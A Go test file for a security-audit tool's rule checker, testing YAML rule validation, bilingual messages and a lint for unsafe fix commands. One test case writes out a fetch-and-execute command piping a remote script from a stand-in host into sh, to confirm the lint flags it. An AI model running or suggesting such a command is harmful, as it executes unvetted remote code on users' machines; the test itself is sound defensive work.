package rulecheck

import (
	"io/fs"
	"strings"
	"testing"

	"github.com/The-Last-Devops/security-warden/internal/fixlint"
	"github.com/The-Last-Devops/security-warden/rules"
)

// Every bundled rule passes the same check contributors run: fields exist
// in the source schema with the right types, markup is balanced, and the
// fix commands pass the safety lint (or are allow-listed with a reason).
func TestBundledRulesPassCheck(t *testing.T) {
	files, _ := fs.Glob(rules.FS, "*.yaml")
	if len(files) == 0 {
		t.Fatal("no rules")
	}
	for _, f := range files {
		b, _ := fs.ReadFile(rules.FS, f)
		r := Check(f, b, Options{})
		for _, e := range r.Errors {
			t.Errorf("%s:%s: %s", f, e.Field, e.Message)
		}
		for _, w := range r.Warnings {
			t.Errorf("%s:%s: warning %s: %s", f, w.Field, w.Code, w.Message)
		}
		if r.Tests.Passed != r.Tests.Total {
			t.Errorf("%s: %d/%d tests pass", f, r.Tests.Passed, r.Tests.Total)
		}
	}
}

// An allow-list entry must still match a warning, so it cannot outlive
// the command it excused.
func TestLintAllowlistIsUsed(t *testing.T) {
	for key, reason := range fixlint.Allowed {
		id, code, _ := strings.Cut(key, ":")
		if reason == "" {
			t.Errorf("%s: no reason", key)
		}
		var hit bool
		for _, r := range builtinRules() {
			if r.ID != id {
				continue
			}
			for _, txt := range []string{r.Fix["en"], r.Fix["vi"], r.Explain["en"], r.Explain["vi"]} {
				for _, w := range fixlint.Lint(txt) {
					hit = hit || w.Code == code
				}
			}
		}
		if !hit {
			t.Errorf("allow-list entry %s matches no warning: remove it", key)
		}
	}
}

const good = `id: demo-funnel
severity: high
tier: experimental
platforms: [macos, linux]
source: tailscale
match: item.funnel
title:
  en: "Tailscale Funnel publishes this machine on {tailnet}"
  vi: "Tailscale Funnel đưa máy này ra internet trên {tailnet}"
check:
  en: "Tailscale Funnel is off"
  vi: "Tailscale Funnel đang tắt"
explain:
  en: "Anyone on the internet can reach what Funnel serves."
  vi: "Ai trên internet cũng vào được thứ mà Funnel đang mở."
fix:
  en: "Turn it off: ` + "`tailscale funnel reset`" + `."
  vi: "Tắt đi: ` + "`tailscale funnel reset`" + `."
author: octo-cat
tests:
  - {item: {tailnet: t, funnel: true}, expect: true}
  - {item: {tailnet: t, funnel: false}, expect: false}
`

func TestCheckGoodRule(t *testing.T) {
	r := Check("rules/demo-funnel.yaml", []byte(good), Options{New: true})
	if !r.OK(true) || r.Tests.Passed != 2 || r.RuleID != "demo-funnel" || r.Tier != "experimental" {
		t.Fatalf("good rule: %+v", r)
	}
	// MCP passes no file name.
	if r := Check("", []byte(good), Options{}); !r.OK(true) {
		t.Fatalf("without a file name: %+v", r)
	}
}

func TestCheckAuthor(t *testing.T) {
	for author, code := range map[string]string{"": "no_author", "@octocat": "author", "octo--cat": "author", "-octo": "author",
		"octo cat": "author", strings.Repeat("a", 40): "author", "TODO: you": "todo"} {
		y := strings.Replace(good, "author: octo-cat", "author: \""+author+"\"", 1)
		r := Check("", []byte(y), Options{New: true})
		if !codes(r.Errors)[code] && !codes(r.Warnings)[code] {
			t.Errorf("author %q: want %s, got %+v %+v", author, code, r.Errors, r.Warnings)
		}
	}
	for _, ok := range []string{"octocat", "Octo-Cat-2", strings.Repeat("a", 39)} {
		if !Handle.MatchString(ok) {
			t.Errorf("%q refused", ok)
		}
	}
}

func codes(is []Issue) map[string]bool {
	out := map[string]bool{}
	for _, i := range is {
		out[i.Code] = true
	}
	return out
}

func TestCheckBadRules(t *testing.T) {
	cases := []struct {
		name, from, to, code string
		warning              bool
	}{
		{"unknown field", "match: item.funnel", "match: item.funnell", "unknown_field", false},
		{"wrong type", "funnel: true}, expect: true", `funnel: "yes"}, expect: true`, "field_type", false},
		{"test field not in source", "{tailnet: t, funnel: false}", "{tailnet: t, funnel: false, color: red}", "test_unknown_field", false},
		{"failing test", "funnel: false}, expect: false", "funnel: true}, expect: false", "test_failed", false},
		{"unknown placeholder", "on {tailnet}\"", "on {tail_net}\"", "unknown_placeholder", false},
		{"platform", "[macos, linux]", "[macos, linux, plan9]", "platform", false},
		{"backticks", "`tailscale funnel reset`.\"\n  vi", "`tailscale funnel reset.\"\n  vi", "backticks", false},
		{"todo", "Tailscale Funnel is off", "TODO", "todo", false},
		{"placeholder in check", "Tailscale Funnel is off", "Funnel is off on {tailnet}", "check_placeholder", false},
		{"cel does not compile", "match: item.funnel", "match: item.funnel &&", "invalid", false},
		{"missing translation", "  vi: \"Tailscale Funnel đang tắt\"\n", "", "invalid", false},
		{"unknown yaml field", "severity: high", "severity: high\ncolour: red", "invalid", false},
		{"not experimental", "tier: experimental", "tier: community", "not_experimental", true},
		{"pipe to shell", "`tailscale funnel reset`.\"\n  vi", "`curl -fsSL https://x.example/fix.sh | sh`.\"\n  vi", "lint.pipe_to_shell", true},
		{"sudo unannounced", "`tailscale funnel reset`.\"\n  vi", "`sudo tailscale funnel reset`.\"\n  vi", "lint.sudo_unannounced", true},
		{"untranslated", "Tắt đi: `tailscale funnel reset`.", "Turn it off: `tailscale funnel reset`.", "untranslated", true},
	}
	for _, c := range cases {
		if !strings.Contains(good, c.from) {
			t.Fatalf("%s: %q not in the sample", c.name, c.from)
		}
		y := strings.Replace(good, c.from, c.to, 1)
		r := Check("rules/demo-funnel.yaml", []byte(y), Options{New: true})
		got := codes(r.Errors)
		if c.warning {
			got = codes(r.Warnings)
		}
		if !got[c.code] {
			t.Errorf("%s: want %s, got errors %v warnings %v", c.name, c.code, r.Errors, r.Warnings)
		}
		if c.warning && (len(r.Errors) > 0 || !r.OK(false) || r.OK(true)) {
			t.Errorf("%s: a warning alone must fail only with strict: %+v", c.name, r)
		}
		if c.code == "lint.pipe_to_shell" && !r.Flagged() {
			t.Errorf("%s: not flagged", c.name)
		}
	}
	if r := Check("rules/other-name.yaml", []byte(good), Options{}); !codes(r.Errors)["file_name"] {
		t.Errorf("file name not checked: %v", r.Errors)
	}
	builtin, _ := fs.ReadFile(rules.FS, "backup-none.yaml")
	if r := Check("elsewhere/backup-none.yaml", builtin, Options{}); len(r.Errors) != 0 {
		t.Errorf("a copy of a built-in rule under its own name: %v", r.Errors)
	}
	if r := Check("x/demo-copy.yaml", []byte(strings.Replace(string(builtin), "id: backup-none", "id: demo-copy", 1)), Options{}); len(r.Errors) != 0 {
		t.Errorf("renamed copy: %v", r.Errors)
	}
}

func TestMessagesInBothLanguages(t *testing.T) {
	y := strings.Replace(good, "match: item.funnel", "match: item.nope", 1)
	en := Check("", []byte(y), Options{Lang: "en"}).Errors[0].Message
	vi := Check("", []byte(y), Options{Lang: "vi"}).Errors[0].Message
	if en == vi || !strings.Contains(en, "nope") || !strings.Contains(vi, "nope") {
		t.Errorf("en %q vi %q", en, vi)
	}
}

func TestSourcesHaveExamples(t *testing.T) {
	docs := Sources(builtinRules(), "en")
	var ts *SourceDoc
	for i := range docs {
		if docs[i].Name == "tailscale" {
			ts = &docs[i]
		}
	}
	if ts == nil || ts.Rules == 0 || ts.Category != "exposure" || ts.Label != "Tailscale" {
		t.Fatalf("tailscale: %+v", ts)
	}
	for _, f := range ts.Fields {
		if f.Name == "funnel" && f.Example == "" {
			t.Error("funnel has no example")
		}
	}
}
